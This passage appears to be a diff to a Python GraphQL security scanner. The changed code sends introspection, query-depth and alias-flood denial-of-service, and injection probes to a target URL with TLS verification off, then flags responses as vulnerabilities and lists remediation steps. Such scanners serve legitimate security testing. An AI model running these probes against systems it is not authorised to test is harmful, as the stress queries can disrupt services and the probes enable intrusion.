-                    vulnerabilities.append(vuln)
-                    self.scan_statistics['mutations_exposed'] += 1
+                    
+                    if unauth_mutations:
+                        vuln = GraphQLVulnerability(
+                            vulnerability_type='GraphQL Vulnerability',
+                            graphql_type=GraphQLVulnerabilityType.AUTHORIZATION_BYPASS,
+                            url=target_url,
+                            severity='Critical',
+                            evidence=f'Mutations accessible without auth: {", ".join(unauth_mutations)}',
+                            query_used='Mutation Auth Test',
+                            response_status=200,
+                            response_size=0,
+                            response_time=0,
+                            exploitable_mutations=unauth_mutations,
+                            confirmed=True,
+                            confidence_score=0.98,
+                            remediation=self._get_remediation()
+                        )
+                        vulns.append(vuln)
+        
+        if session:
+            dos_vulns = self._test_dos_attacks(target_url, session)
+            vulns.extend(dos_vulns)
+            
+            injection_vulns = self._test_injection_attacks(target_url, session)
+            vulns.extend(injection_vulns)
+        
+        with self.lock:
+            self.vulnerabilities.extend(vulns)
+        
+        return vulns
+    
+    def _test_introspection(self, url: str, response: Dict, session) -> Tuple[bool, Optional[Dict]]:
+        if not session:
+            return False, None
+        
+        for query_str in self.introspection_queries.get_all_queries():
+            try:
+                query = {"query": query_str}
+                resp = session.post(url, json=query, timeout=10, verify=False)
                 
-                if subscriptions:
-                    vuln = GraphQLVulnerability(
-                        vulnerability_type='GraphQL Vulnerability',
-                        graphql_type=GraphQLVulnerabilityType.EXCESSIVE_DATA_EXPOSURE,
-                        url=endpoint.url,
-                        severity='Low',
-                        evidence=f'{len(subscriptions)} subscriptions available: {", ".join(subscriptions[:5])}',
-                        affected_fields=subscriptions,
-                        confirmed=True,
-                        confidence_score=0.7,
-                        remediation=self._remediation_cache
-                    )
-                    vulnerabilities.append(vuln)
-                    self.scan_statistics['subscriptions_exposed'] += 1
+                if resp.status_code == 200:
+                    data = resp.json()
+                    if '__schema' in str(data):
+                        return True, data
+            except:
+                pass
+        
+        return False, None
+    
+    def _test_dos_attacks(self, url: str, session) -> List[GraphQLVulnerability]:
+        vulns = []
+        
+        depth_query = self.payload_generator.generate_depth_attack(20)
+        start = time.time()
+        try:
+            resp = session.post(url, json={"query": depth_query}, timeout=15, verify=False)
+            elapsed = time.time() - start
             
-            alias_payload = self.payload_generator.generate_alias_attack_payload('user { id }', 100)
-            is_vulnerable_alias, alias_count = self.query_analyzer.detect_alias_attack(alias_payload)
-            complexity_alias = self.query_analyzer.estimate_query_complexity(alias_payload)
-            
-            if is_vulnerable_alias and alias_count > 50:
-                vuln = GraphQLVulnerability(
+            if elapsed > 5 or resp.status_code == 500:
+                vulns.append(GraphQLVulnerability(
                     vulnerability_type='GraphQL Vulnerability',
-                    graphql_type=GraphQLVulnerabilityType.ALIAS_ATTACK,
-                    url=endpoint.url,
+                    graphql_type=GraphQLVulnerabilityType.QUERY_DEPTH_ATTACK,
+                    url=url,
                     severity='High',
-                    evidence=f'Alias attack: {alias_count} aliases | Complexity: {complexity_alias:.2f}',
-                    query_used=alias_payload[:200],
-                    complexity_score=complexity_alias,
-                    confirmed=False,
-                    confidence_score=0.75,
-                    remediation=self._remediation_cache
-                )
-                vulnerabilities.append(vuln)
-                self.scan_statistics['alias_attack'] += 1
+                    evidence=f'Depth attack successful - Response time: {elapsed:.2f}s',
+                    query_used=depth_query[:200],
+                    response_status=resp.status_code,
+                    response_size=len(resp.content),
+                    response_time=elapsed,
+                    confirmed=True,
+                    confidence_score=0.87,
+                    remediation=self._get_remediation()
+                ))
+        except:
+            pass
+        
+        alias_query = self.payload_generator.generate_alias_attack(100)
+        try:
+            start = time.time()
+            resp = session.post(url, json={"query": alias_query}, timeout=15, verify=False)
+            elapsed = time.time() - start
             
-            deep_query = self.payload_generator.generate_deep_nested_query(100)
-            depth = self.query_analyzer.analyze_query_depth(deep_query)
-            complexity_deep = self.query_analyzer.estimate_query_complexity(deep_query)
-            
-            if depth > 20:
-                vuln = GraphQLVulnerability(
+            if elapsed > 5 or resp.status_code == 500:
+                vulns.append(GraphQLVulnerability(
                     vulnerability_type='GraphQL Vulnerability',
-                    graphql_type=GraphQLVulnerabilityType.DEPTH_LIMIT_BYPASS,
-                    url=endpoint.url,
-                    severity='High',
-                    evidence=f'Deep nesting: {depth} levels | Complexity: {complexity_deep:.2f}',
-                    query_used=deep_query[:200],
-                    depth_score=depth,
-                    complexity_score=complexity_deep,
-                    confirmed=False,
-                    confidence_score=0.8,
-                    remediation=self._remediation_cache
-                )
-                vulnerabilities.append(vuln)
-                self.scan_statistics['depth_limit_bypass'] += 1
-            
-            circular_query = self.payload_generator.generate_circular_query('user', 50)
-            is_circular, circular_fields = self.query_analyzer.detect_circular_references(circular_query)
-            
-            if is_circular:
-                vuln = GraphQLVulnerability(
-                    vulnerability_type='GraphQL Vulnerability',
-                    graphql_type=GraphQLVulnerabilityType.CIRCULAR_QUERY,
-                    url=endpoint.url,
+                    graphql_type=GraphQLVulnerabilityType.ALIAS_ABUSE,
+                    url=url,
                     severity='Medium',
-                    evidence=f'Circular references: {", ".join(circular_fields[:5])}',
-                    query_used=circular_query[:200],
-                    affected_fields=circular_fields,
-                    confirmed=False,
-                    confidence_score=0.7,
-                    remediation=self._remediation_cache
-                )
-                vulnerabilities.append(vuln)
-                self.scan_statistics['circular_query'] += 1
-            
-            field_dupe_payload = self.payload_generator.generate_field_duplication_payload('id', 100)
-            is_duped, duped_fields = self.query_analyzer.detect_field_duplication(field_dupe_payload)
-            
-            if is_duped:
-                vuln = GraphQLVulnerability(
-                    vulnerability_type='GraphQL Vulnerability',
-                    graphql_type=GraphQLVulnerabilityType.FIELD_DUPLICATION,
-                    url=endpoint.url,
-                    severity='Medium',
-                    evidence=f'Field duplication: {", ".join([f"{k}:{v}x" for k, v in list(duped_fields.items())[:3]])}',
-                    query_used=field_dupe_payload[:200],
-                    confirmed=False,
-                    confidence_score=0.7,
-                    remediation=self._remediation_cache
-                )
-                vulnerabilities.append(vuln)
-                self.scan_statistics['field_duplication'] += 1
-            
-            batch_payload = self.payload_generator.generate_batch_query('{ user { id } }', 100)
-            if len(batch_payload) >= 50:
-                vuln = GraphQLVulnerability(
-                    vulnerability_type='GraphQL Vulnerability',
-                    graphql_type=GraphQLVulnerabilityType.BATCH_ATTACK,
-                    url=endpoint.url,
-                    severity='Medium',
-                    evidence=f'Batch attack: {len(batch_payload)} operations in single request',
-                    query_used=json.dumps(batch_payload[:3]),
-                    confirmed=False,
-                    confidence_score=0.75,
-                    remediation=self._remediation_cache
-                )
-                vulnerabilities.append(vuln)
-                self.scan_statistics['batch_attack'] += 1
-            
-            errors = self.error_analyzer.parse_graphql_errors(response_content)
-            if errors:
-                has_disclosure, disclosure_types = self.error_analyzer.detect_information_disclosure(errors)
+                    evidence=f'Alias attack successful - Response time: {elapsed:.2f}s',
+                    query_used=alias_query[:200],
+                    response_status=resp.status_code,
+                    response_size=len(resp.content),
+                    response_time=elapsed,
+                    confirmed=True,
+                    confidence_score=0.85,
+                    remediation=self._get_remediation()
+                ))
+        except:
+            pass
+        
+        return vulns
+    
+    def _test_injection_attacks(self, url: str, session) -> List[GraphQLVulnerability]:
+        vulns = []
+        
+        injection_payloads = self.payload_generator.generate_injection_payloads()
+        
+        for payload in injection_payloads:
+            try:
+                resp = session.post(url, json={"query": payload}, timeout=10, verify=False)
                 
-                if has_disclosure:
-                    vuln = GraphQLVulnerability(
+                error_indicators = ['syntax error', 'sql', 'mysql', 'postgresql', 'sqlite']
+                if any(ind in resp.text.lower() for ind in error_indicators):
+                    vulns.append(GraphQLVulnerability(
                         vulnerability_type='GraphQL Vulnerability',
-                        graphql_type=GraphQLVulnerabilityType.SENSITIVE_DATA_IN_LOGS,
-                        url=endpoint.url,
-                        severity='Medium',
-                        evidence=f'Information disclosure: {", ".join(disclosure_types[:5])}',
-                        response_data=json.dumps(errors[:3]),
+                        graphql_type=GraphQLVulnerabilityType.INJECTION_VIA_GRAPHQL,
+                        url=url,
+                        severity='High',
+                        evidence=f'Injection indicator detected in response',
+                        query_used=payload,
+                        response_status=resp.status_code,
+                        response_size=len(resp.content),
+                        response_time=0,
                         confirmed=True,
-                        confidence_score=0.85,
-                        remediation=self._remediation_cache
-                    )
-                    vulnerabilities.append(vuln)
-                    self.scan_statistics['info_disclosure'] += 1
-                
-                if self.error_analyzer.detect_sql_errors(errors):
-                    vuln = GraphQLVulnerability(
-                        vulnerability_type='GraphQL Vulnerability',
-                        graphql_type=GraphQLVulnerabilityType.GRAPHQL_INJECTION,
-                        url=endpoint.url,
-                        severity='Critical',
-                        evidence='SQL errors detected in GraphQL responses',
-                        response_data=json.dumps(errors[:2]),
-                        confirmed=True,
-                        confidence_score=0.9,
-                        remediation=self._remediation_cache
-                    )
-                    vulnerabilities.append(vuln)
-                    self.scan_statistics['sql_injection'] += 1
+                        confidence_score=0.82,
+                        remediation=self._get_remediation()
+                    ))
+                    break
+            except:
+                pass
         
-        with self.lock:
-            for endpoint in endpoints:
-                self.discovered_endpoints[endpoint.url] = endpoint
-            self.vulnerabilities.extend(vulnerabilities)
-            self.scan_statistics['total_scans'] += 1
-        
-        return vulnerabilities
+        return vulns
     
-    def test_query_execution(self, endpoint_url: str, query: str) -> Tuple[bool, Optional[str]]:
-        complexity = self.query_analyzer.estimate_query_complexity(query)
-        depth = self.query_analyzer.analyze_query_depth(query)
-        estimated_size = self.query_analyzer.calculate_estimated_response_size(query)
-        
-        if complexity > 1000:
-            return False, f"Query complexity too high: {complexity:.2f}"
-        
-        if depth > 50:
-            return False, f"Query depth too deep: {depth}"
-        
-        if estimated_size > 10000000:
-            return False, f"Estimated response too large: {estimated_size} bytes"
-        
-        query_hash = hashlib.sha256(query.encode()).hexdigest()
-        if query_hash in self.tested_queries:
-            return False, "Query already tested"
-        
-        with self.lock:
-            self.tested_queries.add(query_hash)
-        
-        return True, None
+    def _get_remediation(self) -> str:
+        return (
+            "1. Disable introspection in production. "
+            "2. Implement query depth limiting. "
+            "3. Set query complexity limits. "
+            "4. Rate limit GraphQL endpoint. "
+            "5. Implement proper authentication. "
+            "6. Use query allowlisting. "
+            "7. Validate all inputs. "
+            "8. Monitor query patterns. "
+            "9. Implement field-level authorization. "
+            "10. Use persisted queries."
+        )
     
-    def get_discovered_endpoints(self) -> Dict[str, GraphQLEndpoint]:
-        with self.lock:
-            return self.discovered_endpoints.copy()
-    
-    def get_vulnerabilities(self) -> List[GraphQLVulnerability]:
+    def get_vulnerabilities(self):
         with self.lock:
             return self.vulnerabilities.copy()
     
-    def get_statistics(self) -> Dict[str, int]:
-        with self.lock:
-            return dict(self.scan_statistics)
-    
-    def get_tested_queries(self) -> Set[str]:
-        with self.lock:
-            return self.tested_queries.copy()
+    def get_extracted_schema(self):
+        return self.extracted_schema
     
     def clear(self):
         with self.lock:
-            self.discovered_endpoints.clear()
             self.vulnerabilities.clear()
-            self.scan_statistics.clear()
-            self.tested_queries.clear()
+            self.extracted_schema = None
